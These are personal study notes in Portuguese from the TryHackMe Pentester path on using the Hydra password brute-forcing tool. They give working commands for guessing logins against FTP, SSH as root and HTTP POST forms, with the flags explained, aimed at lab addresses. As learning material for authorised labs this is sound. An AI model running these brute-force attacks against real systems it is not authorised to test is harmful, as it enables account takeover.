# Hydra - Essentials

> Aqui vou compartilhar minhas notas pessoais sobre cada um dos temas aprendidos no camihno Pentester do TryHackMe

Hydra é um programa de quebra de senhas online por força bruta, uma ferramenta rápida de “hacking” de senha de login do sistema. 

As opções que passamos para o Hydra depende de qual protocolo estamos atacando.

## FTP

Por ex, se quisermos realizar um ataque de força bruta no FTP com o usuário já configurado e uma lista de senhas, usuariamos:

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

--- 

## SSH

Já, se quisessemos fazer um ataque SSH, fariamos: 

`hydra -l <username> -P <full path to pass> 10.201.32.244 -t 4 ssh`

Exemplo de preenchido:

`hydra -l root -P passwords.txt 10.201.32.244 -t 4 ssh`

O Hydra usará o usuário root, e irá usar o passlist de passwords.txt, o alvo é 10.201.32.244 e iremos enviar 4 threads por segundo no serviço SSH.

---

## POST Login

Podemos enviar qualquer método, verificar a aba "Network" do navegador para identificar possíveis ataques.

`sudo hydra <username> <wordlist> 10.201.32.244 http-post-form "<path>:<login_credentials>:<invalid_response>"`

Na estrutura acima:

- "-l" o nome do usuario
- "-P" a lista de senhas
- "http-form-post" o tipo do form
- "<path>" é o caminho do form, por ex: login.php
- <login_credentials> é o login, por exemplo: `username=^USER^&password=^PASS^`
- <invalid_response> é a resposta de senha errada, etc.
- "-V" saída detalhada para cada tentativa.

Abaixo um comando mais completo para isso:

`hydra -l <username> -P <wordlist> 10.201.32.244 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect." -V`